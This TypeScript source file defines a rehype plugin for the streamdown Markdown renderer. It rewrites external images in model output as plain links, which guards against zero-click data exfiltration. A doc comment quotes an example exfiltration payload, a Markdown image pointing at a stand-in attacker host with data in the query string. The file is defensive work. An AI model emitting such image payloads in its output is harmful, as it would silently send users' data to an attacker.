import { defaultRehypePlugins, type StreamdownProps } from "streamdown";

// Minimal hast shapes; only elements and text are touched here.
type HastText = { type: "text"; value: string };
type HastElement = {
  type: "element";
  tagName: string;
  properties: Record<string, unknown>;
  children: HastNode[];
};
type HastNode = HastElement | HastText | { type: string; children?: HastNode[] };

/**
 * Model output is untrusted text: an injected `![x](https://attacker.example/?d=…)`
 * would load the moment it renders and carry data out, with no click. Only
 * this app's own media and in-browser (data:image, blob:) pictures render
 * inline; the Content-Security-Policy's img-src backs this up.
 */
export function isInlineImageSource(src: unknown) {
  return (
    typeof src === "string" &&
    (src.startsWith("/api/media/") || src.startsWith("data:image/") || src.startsWith("blob:"))
  );
}

/** Any other image becomes a plain link the user can choose to open. */
function imageAsLink(image: HastElement): HastElement {
  const alt = typeof image.properties.alt === "string" ? image.properties.alt.trim() : "";
  const label: HastText = { type: "text", value: alt || "External image" };
  const src = image.properties.src;
  return typeof src === "string" && src
    ? {
        type: "element",
        tagName: "a",
        properties: { href: src, target: "_blank", rel: ["noreferrer", "noopener"] },
        children: [label],
      }
    : { type: "element", tagName: "span", properties: {}, children: [label] };
}

function rewrite(parent: { children?: HastNode[] }) {
  if (!parent.children) return;
  parent.children = parent.children.flatMap((node): HastNode[] => {
    if (node.type !== "element") return [node];
    const element = node as HastElement;
    // <picture><source srcset> loads its own candidates; the <img> inside stays.
    if (element.tagName === "source") return [];
    if (element.tagName === "img") {
      if (!isInlineImageSource(element.properties.src)) return [imageAsLink(element)];
      delete element.properties.srcSet;
      return [element];
    }
    rewrite(element);
    return [element];
  });
}

export function rehypeExternalImagesAsLinks() {
  return (tree: object) => rewrite(tree as { children?: HastNode[] });
}

/**
 * Streamdown's own pipeline (raw HTML, sanitize, harden) with external images
 * turned into links before harden checks every link. One list for every
 * place that renders model text.
 */
export const markdownRehypePlugins: StreamdownProps["rehypePlugins"] = [
  defaultRehypePlugins.raw,
  defaultRehypePlugins.sanitize,
  rehypeExternalImagesAsLinks,
  defaultRehypePlugins.harden,
];
